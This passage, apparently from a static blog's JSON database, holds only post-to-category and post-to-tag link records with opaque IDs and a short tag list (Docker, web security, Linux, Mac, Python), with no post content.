e9nu0016icswfoox0ulg","_id":"ckqmbe9o0001vicsw4gr93wqn"},{"post_id":"ckqmbe9nw001cicsw68fihakz","category_id":"ckqmbe9nj0008icsw4b8hge02","_id":"ckqmbe9o1001yicswab8i89mj"},{"post_id":"ckqmbe9nw001hicswc9ohh1e8","category_id":"ckqmbe9nj0008icsw4b8hge02","_id":"ckqmbe9o10020icswasd9h01q"},{"post_id":"ckqmbe9no000micsw055fhiux","category_id":"ckqmbe9nu0016icswfoox0ulg","_id":"ckqmbe9o20022icsw7o7nb0tv"},{"post_id":"ckqmbe9nx001kicswgkxg8nj1","category_id":"ckqmbe9nj0008icsw4b8hge02","_id":"ckqmbe9o20024icsw5ovbg8tj"},{"post_id":"ckqmbe9ny001nicsw1nq3grnv","category_id":"ckqmbe9nj0008icsw4b8hge02","_id":"ckqmbe9o20026icsw4xfe8xeh"},{"post_id":"ckqmbe9nz001qicsw2wgag1xs","category_id":"ckqmbe9nj0008icsw4b8hge02","_id":"ckqmbe9o20028icsw93urgfae"},{"post_id":"ckqmbe9o0001ticsw669562h5","category_id":"ckqmbe9nj0008icsw4b8hge02","_id":"ckqmbe9o2002aicsw6rqn54xs"},{"post_id":"ckqmbe9o1001wicswb87x3t5q","category_id":"ckqmbe9nj0008icsw4b8hge02","_id":"ckqmbe9o2002cicswg7q3gnfe"},{"post_id":"ckqmbe9o3002dicswe3119vgs","category_id":"ckqmbe9o4002eicsw3nyj7mtl","_id":"ckqmbe9o6002hicswc7jd19h2"}],"PostTag":[{"post_id":"ckqmbe9nd0001icsw7qhr5oth","tag_id":"ckqmbe9nh0004icswdun63sl2","_id":"ckqmbe9nk000aicsw44imgwz0"},{"post_id":"ckqmbe9nh0005icsw8jo6ggms","tag_id":"ckqmbe9nj0009icsw3fpae300","_id":"ckqmbe9nm000hicswai55eam7"},{"post_id":"ckqmbe9ni0006icswfbn9fs8k","tag_id":"ckqmbe9nh0004icswdun63sl2","_id":"ckqmbe9np000nicsw89xc74by"},{"post_id":"ckqmbe9ni0006icswfbn9fs8k","tag_id":"ckqmbe9nl000ficswfzg798nt","_id":"ckqmbe9nq000picsw4vohhn1i"},{"post_id":"ckqmbe9nm000iicswbwpj25zs","tag_id":"ckqmbe9nj0009icsw3fpae300","_id":"ckqmbe9nr000uicsw1qp3a3r2"},{"post_id":"ckqmbe9nj0007icsw5o7r86c2","tag_id":"ckqmbe9nl000ficswfzg798nt","_id":"ckqmbe9ns000xicswh3vca1jl"},{"post_id":"ckqmbe9np000oicsw24oy60rt","tag_id":"ckqmbe9nj0009icsw3fpae300","_id":"ckqmbe9nt0012icsw1j3a3n2e"},{"post_id":"ckqmbe9nr000ticswfwibf038","tag_id":"ckqmbe9nj0009icsw3fpae300","_id":"ckqmbe9nu0015icswah4udrpi"},{"post_id":"ckqmbe9nk000bicswc9mph37b","tag_id":"ckqmbe9nl000ficswfzg798nt","_id":"ckqmbe9nv001aicsw9ob3582l"},{"post_id":"ckqmbe9ns000wicsw8ojhcsrb","tag_id":"ckqmbe9nj0009icsw3fpae300","_id":"ckqmbe9nw001dicsw0fk39xsv"},{"post_id":"ckqmbe9nt0011icsw3km35bv3","tag_id":"ckqmbe9nj0009icsw3fpae300","_id":"ckqmbe9nx001iicsw7itahrf5"},{"post_id":"ckqmbe9nl000cicsw9sdjabjt","tag_id":"ckqmbe9nl000ficswfzg798nt","_id":"ckqmbe9ny001licswb0io6b8k"},{"post_id":"ckqmbe9nu0014icsw3nkg1ucw","tag_id":"ckqmbe9nj0009icsw3fpae300","_id":"ckqmbe9nz001oicswh7qy9al7"},{"post_id":"ckqmbe9nv0019icswdm1y6u05","tag_id":"ckqmbe9nj0009icsw3fpae300","_id":"ckqmbe9o0001ricsw64mqc2na"},{"post_id":"ckqmbe9nm000gicswahfvfjuc","tag_id":"ckqmbe9nv0018icswgtum2tvo","_id":"ckqmbe9o0001uicswh0nj5mwi"},{"post_id":"ckqmbe9nw001cicsw68fihakz","tag_id":"ckqmbe9nj0009icsw3fpae300","_id":"ckqmbe9o1001xicswc6co9f7j"},{"post_id":"ckqmbe9nw001hicswc9ohh1e8","tag_id":"ckqmbe9nj0009icsw3fpae300","_id":"ckqmbe9o1001zicsw2cl1fcgf"},{"post_id":"ckqmbe9no000micsw055fhiux","tag_id":"ckqmbe9nv0018icswgtum2tvo","_id":"ckqmbe9o10021icsw6caw0gy3"},{"post_id":"ckqmbe9nx001kicswgkxg8nj1","tag_id":"ckqmbe9nj0009icsw3fpae300","_id":"ckqmbe9o20023icsw9mqg36mk"},{"post_id":"ckqmbe9ny001nicsw1nq3grnv","tag_id":"ckqmbe9nj0009icsw3fpae300","_id":"ckqmbe9o20025icswcguvhwur"},{"post_id":"ckqmbe9nz001qicsw2wgag1xs","tag_id":"ckqmbe9nj0009icsw3fpae300","_id":"ckqmbe9o20027icsw0ayj72l4"},{"post_id":"ckqmbe9o0001ticsw669562h5","tag_id":"ckqmbe9nj0009icsw3fpae300","_id":"ckqmbe9o20029icsw0672effy"},{"post_id":"ckqmbe9o1001wicswb87x3t5q","tag_id":"ckqmbe9nj0009icsw3fpae300","_id":"ckqmbe9o2002bicsw2ejpfkb0"},{"post_id":"ckqmbe9o3002dicswe3119vgs","tag_id":"ckqmbe9o4002ficsw0bqr963l","_id":"ckqmbe9o6002gicswcbnacn3i"}],"Tag":[{"name":"Docker","_id":"ckqmbe9nh0004icswdun63sl2"},{"name":"Web安全","_id":"ckqmbe9nj0009icsw3fpae300"},{"name":"Linux","_id":"ckqmbe9nl000ficswfzg798nt"},{"name":"Mac","_id":"ckqmbe9nv0018icswgtum2tvo"},{"name":"Python","_id":"ckqmbe9o4002ficsw0bqr963l"}]}}